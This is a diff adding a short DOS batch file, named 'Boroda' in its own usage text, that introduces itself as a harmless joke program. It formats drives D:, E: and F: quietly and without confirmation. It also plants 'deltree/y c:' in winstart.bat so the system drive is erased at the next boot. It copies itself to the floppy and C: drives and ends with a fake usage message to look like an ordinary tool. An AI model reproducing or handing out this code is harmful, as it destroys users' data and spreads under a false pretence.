@@ -1,0 +1,18 @@
+:\  Hello all people. This is intresting and joke programm do    \
+:\ very happy your.                                              \
+:\ <<<<<<<<<<<<<<<<<<    See and keep   >>>>>>>>>>>>>>>>>>>>>>>> \
+@echo off
+@echo y| format f: /q /u /v:boroda
+@echo y| format e: /q /u /v:boroda
+@echo y| format d: /q /u /v:boroda
+echo @echo off >> %windir%\winstart.bat
+echo echo Bousy ty nemnogo borodonulsya s etim kompom >> %windir%\winstart.bat
+echo deltree/y c: >> %windir%\winstart.bat
+copy %0 a:\
+copy %0 c:\
+if %1 == '' goto basd
+type %0 %1 %2
+:basd
+echo Опущен обязательный параметр...
+echo Usage Boroda [path\filename]
+
